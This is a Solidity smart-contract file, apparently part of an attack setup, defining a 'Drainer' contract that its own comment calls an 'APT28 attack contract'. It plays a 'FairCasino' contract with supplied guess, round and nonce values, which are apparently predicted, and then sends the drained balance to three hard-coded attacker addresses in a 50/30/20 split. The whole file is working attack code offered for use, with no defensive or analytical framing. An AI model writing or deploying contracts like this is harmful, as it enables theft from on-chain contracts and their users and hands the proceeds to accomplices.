// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IFairCasino {
    function play(uint256 guess, uint256 round, uint256 nonce) external payable;
}

/// @title Drainer
/// @notice APT28 attack contract — completes the exploit and distributes
///         funds atomically to the three lieutenants (50/30/20%).
contract Drainer {

    IFairCasino public immutable casino;

    address public constant LT1 = 0xf520cEd3b7FdA050a3A44486C160BEAb15ED3285; // 50%
    address public constant LT2 = 0x334Bdaad35afD9133B2CE6F8259F3dBAc56D95e1; // 30%
    address public constant LT3 = 0xbE99BCD0D8FdE76246eaE82AD5eF4A56b42c6B7d; // 20%

    constructor(address _casino) {
        casino = IFairCasino(_casino);
    }

    function attack(uint256 _guess, uint256 _round, uint256 _nonce) external payable {
        casino.play{value: 0.01 ether}(_guess, _round, _nonce);
        distribute();
    }

    function distribute() public {
        uint256 total = address(this).balance;
        require(total > 0, "nothing to distribute");

        uint256 lt1Amount = total * 50 / 100;
        uint256 lt2Amount = total * 30 / 100;
        uint256 lt3Amount = total - lt1Amount - lt2Amount;

        (bool ok1,) = payable(LT1).call{value: lt1Amount}("");
        (bool ok2,) = payable(LT2).call{value: lt2Amount}("");
        (bool ok3,) = payable(LT3).call{value: lt3Amount}("");

        require(ok1 && ok2 && ok3, "distribution failed");
    }

    receive() external payable {}
}